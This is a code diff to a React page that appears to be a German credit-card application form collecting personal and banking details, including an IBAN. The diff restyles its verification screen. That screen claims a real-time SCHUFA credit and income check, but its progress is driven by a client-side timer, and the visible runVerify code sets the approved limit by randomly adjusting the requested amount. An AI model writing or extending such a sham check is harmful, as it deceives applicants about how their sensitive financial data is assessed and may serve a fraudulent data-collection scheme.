@@ -2,6 +2,19 @@ import { useState, useEffect, useCallback, useMemo, useRef } from "react";
 import GlassNav from "@/components/GlassNav";
 import PremiumFooter from "@/components/PremiumFooter";
 
+/* === CUSTOM ANIMATIONS === */
+const styleElement = document.createElement("style");
+styleElement.textContent = `
+  @keyframes pulseEnergy {
+    0%, 100% { transform: scale(1); opacity: 0.8; }
+    50% { transform: scale(1.05); opacity: 1; }
+  }
+`;
+if (!document.head.querySelector('style[data-pulse-energy]')) {
+  styleElement.setAttribute('data-pulse-energy', 'true');
+  document.head.appendChild(styleElement);
+}
+
 const COUNTRIES = [
   // DACH Region (Priorisiert)
   "Deutschland",
@@ -332,6 +345,7 @@ export default function AntragPage() {
   const [d, setD] = useState({ firstName: "", lastName: "", birthDay: "", birthMonth: "", birthYear: "1990", phoneCountryCode: "+49", phone: "", street: "", zip: "", city: "", country: "", nationality: "", employment: "", employer: "", employedSince: "", income: 0, rent: 0, debts: 0, housing: "", wantedLimit: 0, purpose: "", billing: "Vollzahlung (100%)", addon: "Keine", nfc: "Ja", email: "", iban: "", billingMethod: "iban", ag1: false, ag2: false, ag3: false });
   const [approved, setApproved] = useState(0);
   const [verifyDone, setVerifyDone] = useState(false);
+  const [checkProgress, setCheckProgress] = useState(0);
   const [openFaq, setOpenFaq] = useState<number | null>(null);
 
   useEffect(() => { if (!sessionStorage.getItem("fiaon_sid")) sessionStorage.setItem("fiaon_sid", Math.random().toString(36).slice(2)); window.scrollTo(0, 0); }, []);
@@ -342,6 +356,25 @@ export default function AntragPage() {
       window.scrollTo({ top: 0, behavior: "smooth" });
     }
   }, [step]);
+
+  // Synchronized progress for verification screen
+  useEffect(() => {
+    if (step === 4 && !verifyDone) {
+      setCheckProgress(0);
+      const duration = 12000; // 12 seconds matching backend timer
+      const interval = 50; // Update every 50ms
+      const increment = 100 / (duration / interval);
+      
+      const timer = setInterval(() => {
+        setCheckProgress(prev => {
+          const next = prev + increment;
+          return next >= 100 ? 100 : next;
+        });
+      }, interval);
+      
+      return () => clearInterval(timer);
+    }
+  }, [step, verifyDone]);
 
   // Counter animation for score section
   useEffect(() => {
@@ -421,6 +454,7 @@ export default function AntragPage() {
 
   function runVerify() {
     setVerifyDone(false);
+    setCheckProgress(0);
     setTimeout(() => {
       const mx = pack?.lim || 5000;
       let a = Math.round(d.wantedLimit * (1 + (Math.random() > .5 ? 1 : -1) * (0.05 + Math.random() * 0.1)) / 50) * 50;
@@ -1306,62 +1340,77 @@ export default function AntragPage() {
 
         {/* === STEP 4: Verification === */}
         {step === 4 && (
-          <div className="animate-[fadeInUp_.6s_ease] flex flex-col items-center text-center py-16 sm:py-24 px-4">
-            <div className="w-32 h-32 mb-10 relative">
-              <div className="absolute inset-0 rounded-full border-[2px] border-transparent border-t-[#2563eb] animate-spin" style={{ animationDuration: '2s' }} />
-              <div className="absolute inset-3 rounded-full border-[2px] border-transparent border-r-blue-300 animate-[spin_2.5s_linear_infinite_reverse]" />
-              <div className="absolute inset-6 rounded-full border-[1.5px] border-transparent border-b-blue-200 animate-spin" style={{ animationDuration: '3s' }} />
+          <div className="animate-[fadeInUp_.6s_ease] flex flex-col items-center text-center py-16 sm:py-24 px-4" style={{ background: "#FDFDFD" }}>
+            {/* Premium Spinner */}
+            <div className="relative w-48 h-48 mb-12">
+              {/* Outer Glass Ring */}
+              <div className="absolute inset-0 rounded-full bg-slate-100 border border-slate-200 shadow-sm transition-transform duration-[8000ms] animate-spin" />
               
-              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-14 h-14 rounded-full bg-gradient-to-br from-[#2563eb] to-[#1d4ed8]" style={{ boxShadow: "0 0 40px rgba(37,99,235,.3)" }} />
+              {/* Haptic Core */}
+              <div className="absolute inset-0 flex items-center justify-center">
+                <div className="relative z-10 w-24 h-24 rounded-full bg-blue-600 border-4 border-white shadow-[0_0_15px_rgba(37,99,235,0.3)] animate-pulse" style={{ animation: "pulseEnergy 2s ease-in-out infinite" }}>
+                  <span className="absolute inset-0 flex items-center justify-center font-black tracking-tight text-slate-900 text-5xl">
+                    {verifyDone ? "100" : Math.round(checkProgress)}
+                  </span>
+                </div>
+              </div>
               
               {verifyDone && (
-                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 animate-[scaleIn_.5s_ease]">
-                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5"><polyline points="6 12 10 16 18 8"/></svg>
+                <div className="absolute inset-0 flex items-center justify-center animate-[scaleIn_.5s_ease]">
+                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth={3}><polyline points="6 12 10 16 18 8"/></svg>
                 </div>
               )}
             </div>
 
-            <h3 className="text-2xl sm:text-3xl font-semibold tracking-tight mb-3 fiaon-gradient-text-animated">
+            <h3 className="text-3xl font-black tracking-tight text-slate-900 mb-2">
               {verifyDone ? "Prüfung abgeschlossen" : "Bonitätsprüfung läuft"}
             </h3>
             
-            <p className="text-[15px] text-gray-500 mb-8 max-w-md">
+            <p className="text-sm text-slate-500 font-medium leading-relaxed mb-10 max-w-md">
               {verifyDone 
                 ? "Ihre Daten wurden erfolgreich verifiziert." 
                 : "Wir analysieren Ihre Bonität in Echtzeit."}
             </p>
 
+            {/* Progress Bar */}
             <div className="w-full max-w-sm mb-8">
-              <div className="h-1.5 rounded-full bg-gray-100 overflow-hidden">
+              <div className="h-3 bg-slate-100 rounded-full overflow-hidden relative mb-4">
                 <div 
-                  className={`h-full rounded-full bg-[#2563eb] transition-all relative overflow-hidden ${verifyDone ? "w-full duration-700" : "w-[92%] duration-[8000ms]"} ease-out`}
+                  className={`h-full rounded-full bg-gradient-to-r from-blue-400 via-blue-600 to-blue-700 transition-all duration-300 ease-out relative overflow-hidden`}
+                  style={{ width: `${verifyDone ? 100 : checkProgress}%` }}
                 >
                   <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-[slide_1.5s_ease-in-out_infinite]" />
                 </div>
               </div>
-              <div className="flex justify-between mt-2 text-[11px] font-medium text-gray-400">
-                <span>Wird geprüft</span>
-                <span>{verifyDone ? "100%" : "92%"}</span>
-              </div>
             </div>
 
+            {/* Micro-Milestone Tiles */}
             <div className="grid grid-cols-3 gap-3 max-w-md mx-auto">
               {[
-                { label: "SCHUFA-Prüfung", status: verifyDone ? "done" : "active" },
-                { label: "Einkommenscheck", status: verifyDone ? "done" : "pending" },
-                { label: "Freigabe", status: verifyDone ? "done" : "pending" }
+                { label: "SCHUFA-Prüfung", status: checkProgress >= 33 ? (verifyDone ? "done" : "done") : (checkProgress > 0 ? "active" : "pending") },
+                { label: "Einkommenscheck", status: checkProgress >= 66 ? (verifyDone ? "done" : "done") : (checkProgress >= 33 ? "active" : "pending") },
+                { label: "Freigabe", status: checkProgress >= 100 ? "done" : (checkProgress >= 66 ? "active" : "pending") }
               ].map((item, i) => (
-                <div key={i} className={`p-3 rounded-xl transition-all duration-500 ${item.status === 'done' ? 'fiaon-glass-card-selected' : item.status === 'active' ? 'fiaon-glass-panel animate-pulse' : 'fiaon-glass-panel opacity-50'}`}>
-                  <div className={`w-6 h-6 rounded-full mx-auto mb-2 flex items-center justify-center ${item.status === 'done' ? 'bg-[#2563eb]' : 'bg-gray-200'}`}>
-                    {item.status === 'done' && <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3"><polyline points="6 12 10 16 18 8"/></svg>}
+                <div key={i} className={`bg-white/80 backdrop-blur-xl border rounded-xl p-3 flex flex-col items-center gap-2 w-full transition-all duration-500 ${
+                  item.status === 'done' ? 'border-green-200 bg-green-50/50' : 
+                  item.status === 'active' ? 'border-blue-200 bg-blue-50/50 animate-pulse' : 
+                  'border-slate-200 bg-slate-50/50 opacity-60'
+                }`}>
+                  <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
+                    item.status === 'done' ? 'bg-green-500' : 
+                    item.status === 'active' ? 'bg-blue-500 animate-spin' : 
+                    'bg-slate-200'
+                  }`}>
+                    {item.status === 'done' && <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth={3}><polyline points="6 12 10 16 18 8"/></svg>}
+                    {item.status === 'active' && <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth={2}><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg>}
                   </div>
-                  <div className="text-[11px] font-medium text-gray-600">{item.label}</div>
+                  <div className="text-xs text-slate-600 font-medium leading-relaxed text-center">{item.label}</div>
                 </div>
               ))}
             </div>
 
             {!verifyDone && (
-              <p className="mt-10 text-[12px] text-gray-400 max-w-sm">Bitte haben Sie einen Moment Geduld. Die Prüfung dauert wenige Sekunden.</p>
+              <p className="mt-12 text-xs text-slate-400 font-mono text-center mb-20">Bitte haben Sie einen Moment Geduld...</p>
             )}
           </div>
         )}
